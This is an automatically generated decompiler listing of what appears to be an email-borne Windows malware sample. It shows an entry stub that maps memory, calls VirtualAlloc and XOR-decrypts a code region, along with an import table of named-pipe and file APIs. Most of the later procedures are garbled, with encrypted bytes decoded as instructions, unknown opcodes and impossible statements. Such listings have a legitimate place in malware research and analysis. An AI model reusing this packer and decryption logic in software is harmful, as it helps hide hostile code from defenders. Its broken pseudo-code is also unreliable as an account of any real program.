/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0047/ia32_pe/subject.exe'
 */

/*	Procedure: 0x004012AA - 0x004012F9
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)0;
    (save)16384;
    (save)0;
    (save)4;
    (save)0;
    (save)-1;
    eax = *__imp__CreateFileMappingA();
    if(eax != 0) {
        (save)eax;
        *__imp__GetCurrentProcessId();
        (restore)eax;
        (save)0;
        (save)0;
        (save)0;
        (save)6;
        (save)eax;
        eax = *__imp__MapViewOfFile();
        if(eax != 0) {
            return(L004012FA(eax));
            (restore)eax;
            L0040134C();
            eax = 0;
        }
    }
}

/*	Procedure: 0x004012FA - 0x00401323
 *	Argument size: -24
 *	Local size: 28
 *	Save regs size: 0
 */

L004012FA(A8, A28)
/* unknown */ void  A8;
/* unknown */ void  A28;
{



    *__imp__VirtualQuery(A8, esp, 28);
    eax = A28 >> 12;
    ecx = eax - 1;
    *(esp + eax) = *(esp + eax) + eax;
}

/* DEST BLOCK NOT FOUND: 0040133e -> 0040138a */
/*	Procedure: 0x00401324 - 0x0040134B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401324()
{



    asm("rcr dword [edx+0x100c15ff],cl");
    *(ebp + 1612054372) = *(ebp + 1612054372) + eax + 1;
    (restore)es;
    *(eax + 1 + 1) = *(eax + 1 + 1) + dh;
    asm("cdq");
    asm("popa");
    ebp = ebp + 1896;
    goto L0040138a;
    (save)12288;
    ebp = ecx;
    (save)edi;
    (save)0;
    goto L00401372;
}

/* DEST BLOCK NOT FOUND: 00401363 -> 00401340 */
/* DEST BLOCK NOT FOUND: 00401388 -> 00401336 */
stack space not deallocated on return
/*	Procedure: 0x0040134C - 0x00401397
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 0
 */

L0040134C(A8, A18)
/* unknown */ void  A8;
/* unknown */ void  A18;
{



    asm("pusha");
    edi = 2208;
    esi = 0x40121a;
    A18 = __imp__VirtualAlloc;
    (save)64;
    goto L00401340;
L00401365:
    ebx = 385875968;
    edi = eax;
    ecx = (ecx >> 2) + 1;
    goto L0040137c;
    eax = *ecx();
    A8 = eax;
    ecx = edi;
    goto L00401365;
L0040137c:
    asm("lodsd");
    *edi = eax ^ ebx;
    edi = edi + 4;
    asm("loop 0x40137c");
    ecx = __imp__VirtualFree;
    goto L00401336;
    (save)-64;
    *esp = *esp + ebp;
    edx = 4194304;
}

/*	Procedure: 0x00401398 - 0x00401512
 *	Argument size: 19784
 *	Local size: 0
 *	Save regs size: 0
 */

L00401398(A37)
/* unknown */ void  A37;
{



    *L1415FF73 = eax;
    asm("adc [eax+0x0],al");
    for(asm("in eax,0xc3");; 1; (restore)ebp) {
        *L00400770();
        esi = *(ebp + -701250765);
L004013e6:
        al = al ^ 77;
        if(*(1553013023 + esi + 32) = *(1553013023 + esi + 32) + 4) {
            goto L004013e3;
        }
L004013e9:
        *edi = eax;
        edi = edi + 4;
        eax = 6000;
        edx = edx - 1;
        asm("cld");
        ebp = -1105721461;
    }
    ebx = ebx - edi;
    A37 = A37 - ecx;
L004013b6:
    eax = *edi;
    edx = edx ^ esp;
    goto L004013fc;
    ebx = *(edi + 385876768);
    ecx = ecx + *eax;
    goto L00401400;
    ecx = -453919038;
    ebp = ebp >> 2;
    eax = 2147352599;
    goto L004013dd;
L004013e3:
    while(1) {
L004013dd:
        asm("cld");
        asm("frstor [eax-0x75]");
        asm("Unknown opcode 0xc7");
        edi = esi;
    }
    goto L004013e6;
    asm("popa");
    return;
L004013fc:
    ebp :: 1;
    *edi = eax;
    edi = edi + 4;
L00401400:
    if(ebp & eax) {
        goto L004013b6;
    }
    goto L004013e9;
    *L0040075c();
    asm("sbb edx,[ecx]");
L0040140e:
    L005715de();
    goto L0040148a;
    asm("cld");
    ebp = ebp ^ ebx;
    eax = eax | 114943;
    (restore)ss;
    ecx = ecx - ebx;
    goto L0040146c;
    (save)eax;
L00401423:
    *edi = *esi;
    edi = edi + 1;
    bl = 21;
L00401426:
    L00571982();
L0040142a:
    if(esi = esi + 1) {
        goto L00401423;
    }
    L00402682();
    if(al = al & 201) {
        goto L0040142a;
    }
    eax = 0;
    goto L0040145c;
    eax = L00571982();
    asm("adc al,al");
    *%fs:ebp+0x49] = *%fs:ebp+0x49] / *%fs:ebp+0x49];
    edx = *%fs:ebp+0x49] % *%fs:ebp+0x49];
    ebp = -732311573;
    al = *esi;
    eax = eax >> 1;
    asm("arpl cx,di");
    asm("adc ecx,ecx");
    asm("cld");
    (save)cs;
    if(!(esi = esi + 1)) {
        asm("xchg eax,edi");
        asm("cld");
L0040145c:
        if(eax = eax + -125617293) {
            goto L004014be;
        }
        bl = bl - ch;
        al = al & 252;
        ch = ch & al;
        dl = dl | *ebx;
        *eax = *eax + al;
        eax :: 32023;
L0040146c:
        asm("cld");
        asm("in al,0xe8");
        (save)cs;
        asm("adc al,[eax]");
        *(ebx - 61) = *(ebx - 61) + dh;
        ecx = ecx + 1;
        asm("cmpsd");
        asm("adc [ebx+0x75bbfc02],dh");
        asm("loop 0x4014a6");
        (restore)ebp;
        goto L0040140e;
    }
    (save)esi;
    ecx = ecx + 1;
    *(ebx + esi) = eax;
L0040148a:
    (restore)eax;
    (save)eax;
    bl = 22;
    L00571504();
    goto L00401426;
    asm("cld");
    cl = 174;
    cl = 102;
    eax = *L00400704();
    asm("sbb bh,dl");
L004014a2:
    return;
L004014a3:
    (save)ebx;
    (save)ecx;
    al = *esi;
    esi = esi + 1;
    (restore)ds;
    asm("sbb [esi+0x7f12b94b],eax");
    *(ebx + ebp * 8 + 22) = bl;
    asm("salc");
    eax = L527affcb();
    (save)5888;
L004014be:
    (restore)edx;
    asm("xchg eax,edx");
    asm("Unknown opcode 0xd2");
    if(eax = (al & 203) + ecx) {
        goto L004014a3;
    }
    asm("cld");
    (save)cs;
    (save)26879;
    (save)1625877079;
    al = al & 203;
    goto L004014e1;
    asm("scasd");
    asm("adc eax,0x34b8619");
    return;
    goto L004014a2;
    return;
L004014e1:
    asm("sbb [edi+0xcafc59c1],ch");
    (restore)ecx;
    edx = edx & esi;
    (restore)ecx;
    (restore)ebx;
    (restore)edx;
    asm("cld");
    asm("int1");
    ebx = ebx + 1;
    bp = bp - 1;
    *L00400748();
    asm("adc al,0x49");
    eax = *L00400734();
    asm("xchg eax,ecx");
    eax = eax - -1672035490;
L00401502:
    asm("imul dword [ebx]");
    asm("lock in al,0xa4");
    goto L00401502;
    asm("xchg bh,bh");
    asm("adc eax,0x400768");
}

/*	Procedure: 0x00401513 - 0x004015F2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401513()
{



    *esi = *esi + dh;
L00401515:
    asm("faddp st3");
    eax = *L0040105b();
    asm("aam 0x68");
    *(eax + 6946839) = *(eax + 6946839) + al;
    asm("pushf");
    (save)ebx;
    al = al | 80;
    L002b1d80();
    eax = *L00400700();
    es = *(ebx - 117);
    ecx = ecx - 1;
    al :: 255;
    asm("adc [ecx],eax");
    *edi = *edi + dl;
    (restore)ecx;
    return;
    (save)ecx;
    asm("pushf");
    bl = ebx - 1 | ch;
    asm("out 0xff,eax");
    asm("adc eax,0x400730");
    asm("aas");
    ah = 51;
    asm("fucomi st0");
    asm("Unknown opcode 0xda");
    asm("Unknown opcode 0xfe");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    al :: 60;
    asm("sahf");
    if(!(al = al & 88)) {
        asm("sbb al,0xfc");
        (restore)es;
        asm("pusha");
        (save)edi;
        goto L00401515;
        bl = bl - 255;
        asm("popa");
        asm("xchg esi,edi");
        asm("aam 0xff");
        asm("adc eax,0x40071c");
        asm("%d mov esi,0xd7850b03");
        asm("cmovz eax,[esi+0x7]");
        goto L004015ad;
        ecx = 55;
    }
    esi = 922746880;
    asm("cmovnz edx,ecx");
    asm("scasb");
    *edi = *edi + dl;
    goto L004015b3;
L00401590:
    edx = 87;
    *(al - *eax) = *(al - *eax) + al;
    bh = 116;
    (restore)ds;
    edx = 21;
    asm("cld");
    asm("Unknown opcode 0xd9");
    eax = *(esi + 51) & -1609105408;
    goto L00401590;
L004015ad:
    (save)eax;
    (restore)ss;
    return(eax + *eax);
L004015b3:
    eax & -2147477760;
    asm("pmagw mm2,mm1");
    ecx = *(esi + 27);
    eax = *(esi + 8);
    asm("cld");
    asm("scasd");
    asm("enter 0xdd7,0xff");
    asm("adc eax,0x40073c");
    asm("%g and edi,edi");
    asm("adc eax,0x400758");
    asm("std");
L004015d6:
    L00571982();
    if(!(ebp = ebp + 1)) {
        asm("aam 0x41");
    }
    L00402A82();
    asm("adc ebx,esi");
    goto L004015d6;
    cl = 120;
    ebx = ebx >> 1;
    return(*L0040072c());
}

/* DEST BLOCK NOT FOUND: 004016a6 -> 005616ab */
stack space not deallocated on return
/*	Procedure: 0x004015F3 - 0x00401797
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004015F3()
{



L004015f3:
    ecx = 6134;
    esp = esp + esp;
    asm("jecxz 0x40162a");
    eax = L00401A51();
    asm("cld");
    asm("daa");
    ecx = *ebx;
    esp = esp + 1;
    asm("cld");
    ebx = 1552289311;
L00401609:
    ecx = ecx + esi;
    ecx = 1507743;
    edi = eax;
    eax & -1267075239;
    asm("jecxz 0x40163d");
    goto L0040162d;
    asm("jecxz 0x401627");
    esp = esp + esp;
    eax = L00571a48();
    (restore)ebx;
    goto L00401609;
    ecx = 1510210;
L0040162d:
    esi = -1552278047;
    esi = esi + ebx;
    eax = L00401A59();
    eax & -1267072613;
    goto L004015F3;
    (save)edx;
L00401645:
    edx = bh % bh;
    asm("adc eax,0x400764");
L00401649:
    if(!(bh = bh / bh)) {
        return;
        (save)edx;
        eax = eax ^ ebp;
        ecx = ecx / ecx;
        edx = ecx % ecx;
        if(!(ebp & eax)) {
            eax = eax + 1;
        }
        asm("loopne 0x401644");
        (restore)edx;
        goto L00401645;
        *L00400708();
        asm("Unknown opcode 0x8e");
        asm("mul dword [eax-0x75]");
        ds = ebx;
        ecx = *(edx + 80);
        asm("pushf");
        eax = L004018E3();
        if(edi = edi + *(edx + 5952)) {
            goto L004015F3;
        }
        bh = 32;
        edi :: 1074216981;
    }
    *(edx + 605421555) = *(edx + 605421555) + cl;
    (restore)es;
    eax = eax + 1;
L00401690:
    if(!( *(ebp + ecx * 8 + -1358150775) = *(ebp + ecx * 8 + -1358150775) + cl)) {
        (restore)edx;
        eax :: -386165272;
        asm("Unknown opcode 0xff");
        goto L004016c8;
        ebx = *(ebx + 12);
        asm("cld");
        asm("%s jz 0x4016ad");
        asm("xchg eax,esi");
        goto L005616ab;
        asm("pushf");
        *(eax + -411774111) = *(eax + -411774111) >> 1;
        goto L004016dd;
L004016b6:
        *(ebx + 4) = eax;
        asm("scasd");
        if(esp = esp + 1) {
            goto L00401649;
        }
        asm("xlatb");
        asm("insd");
        asm("sti");
        eax = L1f83a0c5();
        goto L004016cd;
L004016c8:
        *(eax + edx + 91) = edx;
        return;
L004016cd:
        asm("scasd");
        if(!(eax = eax + ebp)) {
            edi = edi - ebp;
            eax = L00291230();
            goto L00401690;
            asm("xchg eax,esi");
            asm("loope 0x4016dc");
L004016dd:
            goto ( *(esi - 127));
            asm("%c dec ebp");
        }
        (restore)edx;
        goto L00401690;
        eax = L00291230();
        *ebx = eax;
        asm("scasd");
        if(al = al + ch) {
            goto L004016fd;
        }
        al = al & 103;
    }
    L00291230();
    goto L004016b6;
    bl = 86;
    (save)edx;
    (save)86;
L004016fd:
    asm("pushf");
    asm("fldpi");
    edx :: esp;
    goto L00401723;
L00401704:
    if(!(bh & dl)) {
        goto L0040171b;
        eax = eax << 1;
        >= ? L00401727 : ;
        goto L0040171a;
        asm("Unknown opcode 0xd1");
        *(ebx + 2) = *(ebx + 2) / *(ebx + 2);
        edx = *(ebx + 2) % *(ebx + 2) ^ ebp;
        asm("loop 0x401710");
        goto L0040172a;
L0040171a:
        eax = eax ^ edx;
L0040171b:
        asm("loop 0x401719");
        (restore)ebx;
        goto L00401747;
        asm("cld");
        al = al + 177;
    }
L00401723:
    (restore)ss;
    asm("cld");
    asm("jecxz 0x4016b3");
    (save)cs;
    (save)ecx;
L0040172a:
    al = cl;
    ecx = 1507336;
    if(esp & ecx) {
        goto L00401704;
    }
    (restore)esp;
    != ? 0x401710 : ;
    dl = ah;
    goto L00401723;
    edx = -1055017193;
    al = al & 192;
    ecx = eax;
    asm("cld");
    asm("loopne 0x4017a2");
L00401747:
    (restore)esi;
    asm("popf");
    esi = esi + 1;
    al = al + bl;
    asm("cld");
    dl = 18;
    asm("cmpsb");
    eax = 386541496;
    al = al + ch;
    goto ( *L08E90015);
    al = al + 20;
    (restore)ss;
    *(eax - 24) = *(eax - 24) + dl;
    edi = 1207959552;
    (restore)esi;
    asm("xchg eax,edi");
    goto L0040178d;
    (restore)eax;
    eax = L004002df();
    asm("rol dword [esi],1");
    ebp = ebp - 1;
    goto L00401784;
    eax = L0029155f();
    (save)eax;
L00401784:
    *(esp + eax - 105) = esp;
    eax = L00401513();
L0040178d:
    asm("cld");
    asm("jecxz 0x401753");
    (save)edi;
    (save)3;
    (save)cs;
    al = (eax >> 1) + *(eax >> 1);
}

/* DEST BLOCK NOT FOUND: 004018b4 -> 004018f4 */
stack space not deallocated on return
/*	Procedure: 0x00401798 - 0x004018E2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401798()
{



    *(edi + 385934312) = *(edi + 385934312) + al;
L0040179e:
    bl = bl + ch;
    al = al - 156;
    ebx = ebx - 1;
L004017a9:
    if(*(ebx + 1240138852) = *(ebx + 1240138852) | cl) {
        goto L0040179e;
    }
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    (restore)ecx;
    asm("sbb [edi+0x2afc0651],bh");
    ecx = *(ecx + 67);
    asm("pusha");
    goto L004017e5;
L004017b9:
    asm("Unknown opcode 0xff");
    (fsave) *edx;
    *edi = *edi + dl;
    ecx = ecx >> 2;
    asm("in al,0xab");
    goto L004017a9;
L004017c5:
    asm("salc");
    asm("loop 0x4017cd");
    eax = ebx;
    ch = ch ^ bl;
    asm("Unknown opcode 0xc5");
L004017cd:
    *(ecx + 1)();
    *edi = *edi + dl;
    eax = *(ebx + 19);
    eax = L0029151e();
    goto L004017b9;
    asm("xchg cl,[ebx+0x3f1c1f2]");
    goto L004017c5;
L004017e5:
    asm("pushf");
    (save)ss;
    *(eax >> 182) = *(eax >> 182) + (eax >> 182);
    ebx = edi;
    eax = 0;
    goto L004017cd;
    (save)ecx;
    edx = *(esi + 20) & 65535;
    edi = *ebx;
    L00002ab4();
    ss = *ecx;
L00401802:
    eax = *(ecx + 16)();
    asm("aam 0xff");
    asm("adc eax,0x400750");
    return;
    ecx = *(ebx + 12);
    if(!(edi = edi + 1)) {
    }
    goto L00401802;
    >= ? L00401857 : ;
L00401816:
    (save)9984;
    goto L00401816;
L0040181e:
    if(!(ecx = ecx - eax)) {
        eax = eax + ecx;
        ebx = ebx ^ esi;
        (save)ecx;
        goto L0040183d;
        ebp = ebp - 1;
        (restore)ecx;
        return;
L0040182c:
        eax = eax ^ ebp;
        ecx = 1553013013;
L00401832:
        ecx = ecx ^ ebx;
    }
    asm("loopne 0x401828");
    goto L00401863;
    ebp = ebp + 1;
    (save)ecx;
    goto L0040182c;
L0040183d:
    asm("pushf");
    asm("enter 0xa4f3,0xfc");
    (restore)ss;
    (restore)edx;
    *(ebp + 4) = *(ebp + 4) + edx;
    goto L0040181e;
    asm("pushf");
    edx = edx + 1;
    al = al + 82;
    asm("loopne 0x401830");
    ebx = ebx ^ esp;
    edx = 1552289403 / 1552289403 % 1552289403 / 1552289403;
    goto L00401832;
    ecx = 1553013050 ^ ebx;
    asm("cld");
    asm("out 0xb8,al");
L00401863:
    asm("sbb [esi],ecx");
    asm("xchg bl,[ebx+esi-0x2c]");
    eax = eax + edx;
    (restore)ecx;
    asm("cld");
    asm("aam 0x17");
    ebp = ebp - 1;
    asm("das");
    asm("xchg eax,ecx");
    eax = eax - 1;
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf7");
    *(ebx + esi + -44046114) = *(ebx + esi + -44046114) | ch;
    Lc70edc81();
    esi = *ebx;
    esp = esp + *(ecx + 60);
    ecx = *(esi + 147);
    asm("pushf");
    *edi = *edi + 128;
    bl = bl + ch;
    asm("adc ebx,[edi+ecx+0x549ac68b]");
    asm("adc [edx],eax");
    asm("loopne 0x401860");
    *eax = *eax + al;
    (restore)ss;
    *edi = *edi | 68;
    asm("fucomp st3");
    (save)ss;
    asm("jecxz 0x4018cd");
    if(esi != 0) {
        esi = esi + *ebx;
        goto L004018f4;
        (save)esi;
        edi = edi + *ebx;
        *(ebx + -390010093) = *(ebx + -390010093) | 1507767;
L004018ba:
        *edi = eax;
        if(edi = edi + 4) {
            goto L004018ba;
        }
        asm("cld");
        eax = eax | -400865789;
        asm("xchg eax,ebx");
        *edi = *edi + edx;
        *(ebx + -555022466) = *(ebx + -555022466) + cl;
    }
    (restore)esi;
    asm("xchg eax,esp");
    asm("Unknown opcode 0xc6");
    asm("adc al,0xeb");
    asm("Unknown opcode 0xc5");
    return;
    eax = *ebx;
    asm("arpl bx,di");
}

/* DEST BLOCK NOT FOUND: 004018e3 -> 004018cb */
/* DEST BLOCK NOT FOUND: 004018ec -> 004018dd */
/* DEST BLOCK NOT FOUND: 004018f4 -> 004018db */
stack space not deallocated on return
/*	Procedure: 0x004018E3 - 0x00401949
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004018E3()
{



    goto L004018cb;
    (restore)ebp;
    (restore)ebx;
    return;
    *(esp + ecx + 88) = *(esp + ecx + 88) + 1;
    goto L004018dd;
    ebx = *(ebx + 12);
    ebp = ebp + 1;
    (save)ecx;
    (save)eax;
    goto L004018db;
    (save)ebx;
    (save)eax;
    (save)esp;
    asm("cld");
    asm("rep inc eax");
    asm("aas");
    asm("int 0x52");
    edx = 5890;
    goto L00401940;
L00401906:
    (save)edx;
    L004004a3();
    goto L00401940;
    if(edx = edx - 1) {
        goto L00401906;
    }
    asm("aam 0x8d");
    == ? L00401917 : ;
    asm("Unknown opcode 0x0f");
    edx = *(eax + 17) & 65535;
    esi = esi - 40;
    (save)ebp;
    eax = *(eax + 80);
    asm("cld");
    asm("Unknown opcode 0xdb");
    ecx = *ebx;
    asm("pushf");
    asm("jpo 0x401934");
    edx = *(esi + 60);
    eax = eax + ecx;
    asm("sbb [edi+0xdffc1450],dh");
    asm("xchg eax,ecx");
    L004018E3();
    ebp = ebp - 1;
    esi = esi + 40;
    asm("cld");
    asm("iret");
    (restore) *(edi + -997498754);
L00401940:
    asm("xchg eax,esp");
    asm("in al,dx");
    al = al - 139;
    asm("retf");
}

/*	Procedure: 0x0040194A - 0x0040199F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040194A()
{



    goto L0040197a;
L0040194c:
    L00401798();
    asm("xchg eax,esp");
    asm("les ebp,[ecx]");
    asm("aam 0x8d");
    ebx = ebx + 1;
    asm("adc al,0x9e");
    ebx = ebx + 1;
    al = (al | 235) + ch;
    bh :: ch;
    Leb2b0265();
    asm("Unknown opcode 0xff");
    *ebx = *ebx + 1;
    asm("popa");
    if(al < 137) {
        L00291666();
        goto L0040194c;
        asm("sahf");
        asm("adc edx,[eax+0x6af3eb]");
L0040197a:
        *(eax + edx - 21) = edx;
        asm("aad 0x15");
        if(dl = dl + dl) {
            goto L00401998;
        }
        dl = *esi;
        esi = esi + 1;
        eax = eax + 1102627794;
    }
    (save)0;
    eax = *(esp + ecx + 80);
    *L7D06EB58 = *L7D06EB58 + 1;
L00401998:
    *(ecx + edx * 2 - 4) = *(ecx + edx * 2 - 4) + dl;
    asm("out dx,eax");
}

/* DEST BLOCK NOT FOUND: 00401a39 -> 00401a6e */
/*	Procedure: 0x004019A0 - 0x00401A50
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019A0()
{



    (save)eax;
    > ? L004019f4 : ;
    goto ( *( *( *(ebx + 31) + 56) + 1508442108));
    return;
    return;
    *(ebx + -347663247) & cl;
L004019b5:
    asm("daa");
    ebp = ebp + *(esi + edx * 2);
    (save)edi;
    goto L004019fb;
    return;
    esi = eax - 1;
    (restore)eax;
    esi = esi + *(ebx + 19);
    edi = *(ecx + 12);
    asm("cld");
    asm("in eax,dx");
    edx = 0;
    asm("pushf");
    ecx = ecx - 1;
    al :: 247;
    asm("out 0xf,al");
    asm("scasd");
    asm("ror dword [ebp-0x15],0xe7");
    (save)ecx;
    asm("pushf");
    asm("enter 0xc985,0xfc");
    asm("adc al,0x51");
    (save)edx;
    asm("pushf");
    ebx = ebx - 1;
L004019e3:
    *(ebx + 1373891537) = *(ebx + 1373891537) | cl;
    asm("pushf");
    asm("cmpsb");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    asm("cld");
    (restore)ds;
    if(!(al = al | ecx + 1)) {
        asm("cld");
        eax = eax + -216667711;
    }
L004019fb:
    *edi = *esi;
    edi = edi + 4;
    (restore)ecx;
    asm("xchg eax,esp");
    *eax = *eax >> 59;
    asm("fnsave [ebp-0x52]");
    goto L004019b5;
    (restore)edi;
    (restore)esi;
    edx = *(esi + 16);
    eax = L00400640();
    goto L004019e3;
    ecx = eax;
    esi = esi >> 2;
    eax = 0;
    asm("in al,0xab");
    (restore)ecx;
    if(esi = esi + 4) {
        goto L00401a56;
    }
    asm("adc ebx,+0x18");
    goto L00401a6e;
    *(eax + 1357447162)();
    eax = L00400339();
    asm("jecxz 0x401a2b");
    eax = eax - *(edx + 8);
    asm("cld");
    bl = bl & *(ebx - 61);
    goto L00401a6e;
    *(ebx + 1552292104) = *(ebx + 1552292104) >> 156;
    asm("aam 0x89");
    edx = edx + 1;
    asm("adc ebp,ebx");
    (save)es;
    (save)ebx;
    asm("xchg eax,esp");
    asm("in al,dx");
    asm("adc al,0xeb");
    asm("cld");
    *(edx + 8) = eax;
}

/* DEST BLOCK NOT FOUND: 00401a51 -> 004019f5 */
/* DEST BLOCK NOT FOUND: 00401a57 -> 00401a25 */
/*	Procedure: 0x00401A51 - 0x00401A58
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401A51()
{



    > ? L004019f5 : ;
    al = al | 127;
    asm("a16 pop eax");
    goto L00401a25;
}

/* DEST BLOCK NOT FOUND: 00401a62 -> 00401a1e */
stack space not deallocated on return
/*	Procedure: 0x00401A59 - 0x00401BAF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401A59(A37)
/* unknown */ void  A37;
{



    asm("popa");
    asm("sti");
    *(edx + 31) = *(edx + 31) + eax;
L00401a5e:
    esi = esi + eax;
    ebx = ebx - edi;
    goto L00401a1e;
    (save)ebx;
    ebx = *(ebx + 27);
    (save)eax;
    goto L00401a74;
    eax = L57506e87();
    bl = bl + al;
L00401a74:
    *(ebx + ebx * 2) = *(ebx + ebx * 2) + 1;
    return;
    goto L00401a5e;
    edx = cx & 65535;
    asm("sbb [edx+0x42181fe1],bh");
    asm("retf 0x9c51");
    (save)ebx;
    al = al | 80;
    eax = L0d031ee0();
L00401a8e:
    ebp = eax;
    (restore)eax;
    asm("cld");
    (save)ss;
L00401a93:
    esp = *(ebx + 7);
    A37 = eax;
    asm("popa");
    goto L00401a8e;
    asm("pushf");
    eax = eax + *ebx + 1;
    ecx = ecx - *(ebx + 51652672);
    goto L00401a93;
    asm("scasb");
    *eax = *eax & al;
    *edi = *edi + dl;
    (save)0;
    asm("loop 0x401a9d");
    esp = esp + 6016;
    (save)edi;
    asm("salc");
    dl = dl + bl;
    asm("rcl edi,cl");
    asm("rep call 0x71f:0x54fb2008");
    asm("insb");
    if(!( *(edi + 11527693) & dh)) {
        >= ? 0x401b1b : ;
        *eax = *eax + al;
        *eax = *eax + al;
        *eax = *eax + al;
        asm("adc ebx,[eax+0x39]");
        al = al ^ 55;
        edi = edi - 1;
        (restore)eax;
        asm("enter 0x180,0xdc");
        *eax = *eax + al;
        *eax = *eax + al;
        esp = esp - 1;
        eax = eax | -1711255888;
    }
    *eax = *eax + al;
    asm("jecxz 0x401a91");
    (restore)ds;
    asm("repne adc edi,0xc6e5195a");
    asm("aad 0x8");
    eax = eax | 131072;
    *(ecx + 1287856752) = *(ecx + 1287856752) + al;
    asm("insb");
    asm("adc al,0x8c");
    asm("adc [eax],al");
L00401b0a:
    *eax = *eax + al;
    (restore)ss;
    asm("sbb al,[eax+0x8a541e95]");
    asm("aam 0xc");
    *eax = *eax + al;
    asm("repne bound edi,[eax]");
    asm("adc [eax],ebp");
    edi = edi - 1;
    *(eax + 64) = *(eax + 64) + ah;
    asm("lahf");
    (save)-2034741750;
    asm("insb");
    (restore)esp;
    asm("adc bh,ah");
    *(ebx + edi * 2) = *(ebx + edi * 2) + ah + *(esi + esi * 2 + 134217945);
    (restore)ds;
    asm("loopne 0x401bb1");
    asm("sbb dword [edi+0x863f8100],+0x6f");
    asm("int 0x0");
    *eax = *eax + al;
    *(ebx - 100) = *(ebx - 100) + dh;
    if(eax = eax + 1956964465) {
        goto L00401b0a;
    }
    asm("adc eax,0x7c1f1cb6");
    *eax = *eax + al;
    *eax = *eax + al;
    eax = eax - 1 + 18473785;
    asm("insd");
    (restore)ebx;
    asm("xchg eax,esp");
    *eax = *eax | al;
    *(edx + edi * 2 + 28) = *(edx + edi * 2 + 28) + bl;
    asm("xchg eax,esi");
    esp = ebp;
    (restore)ebp;
    ebp = 1718254655;
    *eax = *eax & *L00080885;
    (restore)ecx;
    bl = 8 + cl;
    (save)eax;
    asm("sbb al,0x54");
    asm("jpe 0x401b81");
    *edx = *edx + al;
    asm("salc");
    (save)ss;
    asm("xchg eax,ecx");
    asm("sbb ecx,[esi+0xd460c0b7]");
    asm("outsb");
    ebp = ebp & *(eax + 34603024);
    *(esp + (dl + *esi) * 4 - 128) :: bl;
    (restore)edi;
    (save)edx;
    asm("in eax,0x89");
    asm("jpo 0x401b82");
    al = al | 34;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    edi = edi + 1;
    *ecx = *ecx - cl;
    1397248840 = *(eax + eax * 8) * ebx;
}

/*	Procedure: 0x00402682 - 0x00402A81
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402682()
{



}

/*	Procedure: 0x00402A82 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402A82()
{



}

/* address  size  */
/* 0x00400043       0 */ /* unknown */ void 	__imp__;
/* 0x00401000       0 */ /* unknown */ void 	__imp__HeapValidate;
/* 0x00401004       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401008       0 */ /* unknown */ void 	__imp__SetNamedPipeHandleState;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__GetNamedPipeHandleStateA;
/* 0x00401010       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x00401014       0 */ /* unknown */ void 	__imp__ConnectNamedPipe;
/* 0x00401018       0 */ /* unknown */ void 	__imp__VirtualQuery;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x00401020       0 */ /* unknown */ void 	__imp__MapViewOfFile;
/* 0x00401024       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x00401028       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__TransactNamedPipe;
/* 0x00401030       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401034       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401038       0 */ /* unknown */ void 	__imp__CreateFileMappingA;
/* 0x0040103c       0 */ /* unknown */ void 	__imp__HeapWalk;
/* 0x00401040       0 */ /* unknown */ void 	__imp__FileTimeToLocalFileTime;
/* 0x00401044       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401048       0 */ /* unknown */ void 	__imp__HeapUnlock;
/* 0x0040104c       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00401050       0 */ /* unknown */ void 	__imp__UnmapViewOfFile;
/* 0x00401054       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00401058       0 */ /* unknown */ void 	__imp__HeapSummary;
/* 0x0040105c       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x00401060       0 */ /* unknown */ void 	__imp__CreateNamedPipeA;
/* 0x00401064       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00401068       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x0040106c       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x00401070       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x004012aa       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
